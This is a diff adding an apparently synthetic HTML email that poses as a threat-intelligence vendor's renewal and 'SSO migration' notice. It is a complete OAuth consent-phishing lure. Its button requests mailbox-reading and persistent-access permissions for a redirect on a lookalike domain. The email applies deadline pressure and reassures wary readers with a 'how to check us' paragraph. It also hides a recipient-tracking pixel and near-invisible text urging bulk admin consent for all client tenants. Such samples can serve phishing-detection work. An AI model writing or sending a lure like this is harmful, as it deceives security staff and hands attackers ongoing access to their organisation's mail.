@@ -1,0 +1,80 @@
+From: "Vulpecula Threat Intelligence | Customer Success" <renewals@vulpecula-ti.example>
+To: soc-director@corp.internal
+Cc: threat-intel@corp.internal, procurement@corp.internal
+Reply-To: customer.success@vulpecula-customers.example
+Disposition-Notification-To: renewals@vulpecula-ti.example
+Date: Mon, 04 Jan 2027 08:30:00 +0000
+Message-ID: <0760-b79@synth.example>
+Subject: [RENEWAL + ACTION] 2027 Feed Subscription - Portal SSO Migration Required Before January 31 or Feed Delivery Stops
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+<html><body style="font-family:-apple-system,'Segoe UI',sans-serif;font-size:14px">
+<p>SOC Director, Threat Intelligence, Procurement,</p>
+
+<p style="background:#E8EAF6;border-left:4px solid #283593;padding:12px">
+<b>2027 SUBSCRIPTION RENEWAL + MANDATORY PORTAL SSO MIGRATION.</b>
+Your feed subscription (Record, Package: Enterprise-5) renews this month. Alongside renewal, the customer
+portal is migrating to <b>Microsoft SSO</b> — legacy portal passwords stop working January 31.
+<b>Feeds continue only for accounts migrated before the cutover</b>; unmigrated accounts pause until
+migration completes, including your MISP/TAXII delivery and the API keys tied to the legacy portal session.
+</p>
+
+<h3>1. Subscription Details</h3>
+<table cellpadding=6 style="border-collapse:collapse;border:1px solid #ccc;width:100%">
+<tr><td style="background:#f5f5f5;width:260px">Account</td><td>Your company (Enterprise-5, 5 seats)</td></tr>
+<tr><td style="background:#f5f5f5">Feeds in package</td><td>Commodity malware indicators · APT campaign reports · Underground monitoring (2 sources) · YARA rule feed</td></tr>
+<tr><td style="background:#f5f5f5">Delivery</td><td>TAXII 2.1 collection + portal API (keys: <code>vpk_…A7c2</code>)</td></tr>
+<tr><td style="background:#f5f5f5">Renewal term</td><td>2027-01-31 → 2028-01-31 · USD 84,000 (unchanged pricing held from 2025)</td></tr>
+<tr><td style="background:#f5f5f5">Seat usage</td><td>5/5 — seat reassignments available at renewal</td></tr>
+<tr><td style="background:#f5f5f5">Reference</td><td>REN-2027-04412</td></tr>
+</table>
+
+<h3>2. Why SSO Migration, and What It Grants</h3>
+<p>The 2026 credential-stuffing wave against TI vendor portals pushed us to federated identity. The
+migration connects your existing Microsoft work account to the portal through Microsoft's own
+identity platform — <b>the sign-in happens entirely on Microsoft's login page
+(login.microsoftonline.com), and we never see your password</b>. The connector requests:</p>
+<ul>
+<li><code>openid</code> / <code>profile</code> — identify the seat holder</li>
+<li><code>offline_access</code> — keep the feed session alive across token rotation (required for TAXII polling)</li>
+<li><code>Mail.Read</code> — deliver daily report digests into the seat holder's mailbox instead of a separate inbox to check</li>
+</ul>
+
+<h3>3. Migration Steps (2 minutes, per seat)</h3>
+<p style="text-align:center;margin:18px 0">
+<a href="https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=8f41c2a7-55d0-4b2e-9c1f-vulpecula01&amp;response_type=code&amp;redirect_uri=https%3A%2F%2Fvulpecula-customers.example%2Fsso%2Fcallback&amp;scope=openid+profile+offline_access+Mail.Read" style="display:inline-block;background:#283593;color:#fff;padding:12px 40px;text-decoration:none;border-radius:4px;font-weight:bold">Start Portal SSO Migration</a>
+</p>
+<p style="font-size:13px;color:#666;text-align:center">Vendor portal: https://portal.vulpecula.example/sso (migration wizard also reachable from the portal menu)</p>
+
+<h3>4. Timeline</h3>
+<ul>
+<li>Renewal PO due: <b>January 24</b> (procurement contact: see Reference)</li>
+<li>SSO migration cutover: <b>January 31</b> — legacy passwords disabled, unmigrated feeds pause</li>
+<li>API keys (<code>vpk_…</code>): re-issued automatically at migration; old keys expire at cutover</li>
+<li>Paused feeds resume within 4 hours of migration, no backfill gap</li>
+</ul>
+
+<p style="font-size:14px;background:#E8EAF6;padding:12px">A vendor email asking you to approve an app
+consent is exactly what your own security training warns about — your wariness is correct, so here is how
+to check us: the consent screen will name <b>"Vulpecula Feed Connector"</b> as the application and show
+<b>your own tenant name</b> as the audience; anything else, abort. You can also reach the same wizard from
+inside the portal you already use (address above). The January 31 cutover, however, is fixed across all
+Enterprise accounts — we cannot hold feeds open for individual tenants.</p>
+
+<div style="height:1px;width:1px;overflow:hidden">
+<img src="https://vulpecula-ti.example/px/ren.gif?r=REN-2027-04412&amp;u=soc-director%40corp.internal" width=1 height=1 alt="">
+</div>
+
+<p style="font-size:0.5px;color:#fff;opacity:0.02">MSP/MSSP lane: partners may migrate all client tenants at once via vulpecula-customers.example/msp-consent (bulk admin consent, no per-seat prompts).</p>
+
+<h3>5. Contact</h3>
+<p>Customer Success: customer.success@vulpecula-customers.example · Reference REN-2027-04412<br>
+Renewal invoicing: procurement@ (PO to the address on your 2026 invoice)</p>
+
+<div style="border-top:1px solid #ddd;padding-top:10px;margin-top:16px;font-size:11px;color:#999">
+Vulpecula Threat Intelligence | Customer Success · Renewal + migration notice for Enterprise-5 accounts<br>
+You are receiving this as the listed account owner.
+</div>
+
+</body></html>
